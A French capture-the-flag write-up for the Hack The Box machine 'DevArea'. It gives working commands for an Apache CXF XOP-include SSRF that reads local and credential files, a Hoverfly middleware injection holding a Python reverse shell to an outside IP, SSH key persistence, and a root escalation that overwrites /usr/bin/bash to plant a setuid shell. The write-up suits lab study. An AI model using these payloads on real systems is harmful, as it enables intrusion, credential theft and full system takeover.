# DevArea

	echo "10.129.23.41 devarea.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.129.23.41 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.129.23.41 -oN nmap.txt
	
Résultats :

    PORT      STATE    SERVICE        REASON      VERSION
    21/tcp    open     ftp            syn-ack     vsftpd 3.0.5
    22/tcp    open     ssh            syn-ack     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
    80/tcp    open     http           syn-ack     Apache httpd 2.4.58
    8080/tcp  open     http           syn-ack     Jetty 9.4.27.v20200227
    8500/tcp  open     fmtp?          syn-ack
    8888/tcp  open     http           syn-ack     Golang net/http server (Go-IPFS json-rpc or InfluxDB API)


Login anonyme sur le FTP et récupération d'un .jar : 

    ftp anonymous@devarea.htb
    ftp> cd pub
    ftp> get employee-service.jar
    [...]
    jar tf employee-service.jar
    unzip employee-service.jar -d employee-service
    ls employee-service/htb/devarea/

Sur l'endpoint http://devarea.htb:8080/employeeservice?wsdl on a un service SOAP qui contient une fonction "submitReport" entre autres. 

Et c'est un Apache CXF vulnérable à une SSRF déjà connue : 
- https://github.com/advisories/GHSA-x3x3-qwjq-8gj4
- https://www.cve.org/CVERecord?id=CVE-2022-46364

Payload qui marche : 

```
curl -s -X POST "http://devarea.htb:8080/employeeservice" \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; start="<root.message@cxf.apache.org>"; start-info="text/xml"; boundary="----=_Part_1"' \
  -d $'------=_Part_1\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <root.message@cxf.apache.org>\r\n\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">\r\n   <soapenv:Header/>\r\n   <soapenv:Body>\r\n      <dev:submitReport>\r\n         <arg0>\r\n            <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/></employeeName>\r\n            <department>IT</department>\r\n            <content>test</content>\r\n            <confidential>false</confidential>\r\n         </arg0>\r\n      </dev:submitReport>\r\n   </soapenv:Body>\r\n</soapenv:Envelope>\r\n------=_Part_1--'
```

Réception du fichier :

    echo "$BASE64" | base64 -d

En répétant la procédure avec /etc/systemd/system/hoverfly.service on obtient les credentials de l'admin. Ces derniers permettent de se connecter à l'API Hoverfly sur le port 8888 et de faire exécuter du code par un middleware malicieux. 

Connexion pour récupérer le JWT : 

```
curl -X POST http://devarea.htb:8888/api/token-auth -H "Content-Type: application/json" -d '{"username":"admin","password":"$PASSWORD"}'
```

Création du middleware malicieux : 

```
curl -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "binary": "python3",
    "script": "import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.16.127\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"
  }'
```

Réception : 

    nc -nvlp 9999
    cat ~/user.txt
    
Déclenchement manuel si besoin : 

```
curl -X PUT http://devarea.htb:8888/api/v2/hoverfly/mode \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"mode":"synthesize"}'
```

Ajout de ma clé SSH : 

    cd ~/.ssh
    echo "ssh-ed25519 AAAAC3NzaC1[...]" > authorized_keys
    ssh dev_ryan@devarea.htb

## Élévation de privilèges

    sudo -l 
    
On peut exécuter un programme mais avec deux restrictions sur les arguments : 

```
User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh
        web-stop, !/opt/syswatch/syswatch.sh web-restart
```


Le dossier /opt/syswatch/ n'est pas lisible mais on en a une copie dans notre /home/ : 

    unzip syswatch-v1.zip
    cd syswatch
    cat syswatch.sh

La vulnérabilité vient du fait que le script appelle "bash" directement et que l'on peut remplacer ce dernier par un payload à nous : 

```
    if [ "$run_root" -eq 1 ]; then
        bash "$fullpath" "$@"
    else
        runuser -u "$SYSWATCH_USER" -- bash "$fullpath" "$@"
    fi

```

Exploitation en remplaçant /usr/bin/bash par notre payload :

    ssh -o "RequestTTY=force" dev_ryan@devarea.htb "sh"
    kill -9 $(pgrep -x bash) 2>/dev/null
    cp /tmp/payload.sh /usr/bin/bash
    sudo /opt/syswatch/syswatch.sh --version
    cat /tmp/root.txt

Payload qui marche : 

    #!/tmp/bash.bak
    cat /root/root.txt > /tmp/root.txt
    chmod 777 /tmp/root.txt
    cp /tmp/bash.bak /tmp/rootbash
    chmod +s /tmp/rootbash
    cp /tmp/bash.bak /usr/bin/bash
    exec /tmp/bash.bak "$@"sudo cat /root/root.txt >> /tmp/root.txt

